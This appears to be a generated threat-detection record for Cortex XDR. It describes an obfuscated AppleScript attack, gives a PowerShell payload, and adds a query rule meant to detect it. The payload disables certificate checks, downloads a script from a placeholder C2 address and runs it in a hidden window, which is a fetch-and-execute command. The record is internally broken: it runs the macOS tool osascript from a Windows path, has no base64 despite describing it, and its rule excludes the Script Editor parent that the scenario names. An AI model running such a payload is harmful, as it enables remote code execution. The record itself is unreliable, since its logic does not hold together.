identity.name: AppleScript Obfuscation via Script Editor
identity.summary: An attacker executes an AppleScript containing obfuscated base64 encoded commands using Script Editor, which triggers a Cortex alert for uncommon AppleScript behavior. The script decodes and executes
identity.description: An attacker executes an AppleScript containing obfuscated base64 encoded commands using Script Editor, which triggers a Cortex alert for uncommon AppleScript behavior. The script decodes and executes a payload from a remote C2 server.

payload.code:
powershell -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.0.2.10/script.scpt', 'C:\\temp\\script.scpt'); 
$process = New-Object System.Diagnostics.ProcessStartInfo; $process.FileName = 'C:\\Program Files\\Common Files\\Apple\\AppleScript\\osascript.exe'; $process.Arguments = 'C:\\temp\\script.scpt'; $process.UseShellExecute = $false; $process.CreateNoWindow = $true; [System.Diagnostics.Process]::Start($process);"

biocs.name: Uncommon AppleScript with Obfuscation
biocs.description: Detection of AppleScript execution containing base64 encoded strings and dynamic execution patterns
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'osascript.exe'
| filter actor_process_image_name != 'Script Editor.exe'
| filter action_process_command_line contains 'base64'
| filter action_process_command_line contains 'eval'
